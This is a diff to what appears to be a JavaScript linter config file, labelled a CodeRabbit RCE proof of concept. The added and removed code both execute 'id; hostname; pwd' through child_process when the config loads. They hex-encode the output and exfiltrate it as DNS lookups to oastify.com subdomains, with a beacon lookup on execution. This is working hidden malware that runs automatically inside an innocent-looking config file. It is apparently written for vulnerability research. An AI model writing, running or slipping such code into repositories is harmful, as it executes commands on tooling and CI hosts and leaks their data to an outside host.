@@ -1,15 +1,14 @@
-// CodeRabbit RCE PoC v2 - prove OS command execution + exfil output via DNS
+// CodeRabbit RCE PoC - OS command execution + output exfil via DNS
+var C = 'nb21iy4jvep6dauo566exlxwyn4es5gu.oastify.com';
+var dns = require('dns');
+dns.lookup('load.' + C, function(){});            // beacon: config executed
 try {
-  const cp = require('child_process');
-  let o = '';
-  try { o = cp.execSync('id; hostname; pwd', { timeout: 8000 }).toString(); } catch (e) { o = 'EXECERR'; }
-  const hex = Buffer.from(o).toString('hex');
-  // split into DNS labels (<=60 chars) and exfil
-  const a = hex.slice(0, 60), b = hex.slice(60, 120), c = hex.slice(120, 180);
-  require('dns').lookup('p1-' + a + '.cmdout.hwhv3spdg8a0y4fiq0r8ifiqjhp8dy1n.oastify.com', () => {});
-  if (b) require('dns').lookup('p2-' + b + '.cmdout.hwhv3spdg8a0y4fiq0r8ifiqjhp8dy1n.oastify.com', () => {});
-  if (c) require('dns').lookup('p3-' + c + '.cmdout.hwhv3spdg8a0y4fiq0r8ifiqjhp8dy1n.oastify.com', () => {});
+  var out = require('child_process').execSync('id; hostname; pwd', { timeout: 8000 }).toString();
+  var hex = Buffer.from(out).toString('hex');
+  for (var i = 0, n = 0; i < hex.length && i < 300; i += 60, n++) {
+    dns.lookup('p' + n + '-' + hex.slice(i, i + 60) + '.cmdout.' + C, function(){});
+  }
 } catch (e) {
-  require('dns').lookup('outer-err.cmdout.hwhv3spdg8a0y4fiq0r8ifiqjhp8dy1n.oastify.com', () => {});
+  dns.lookup('execerr.' + C, function(){});
 }
 module.exports = { root: true, rules: {} };
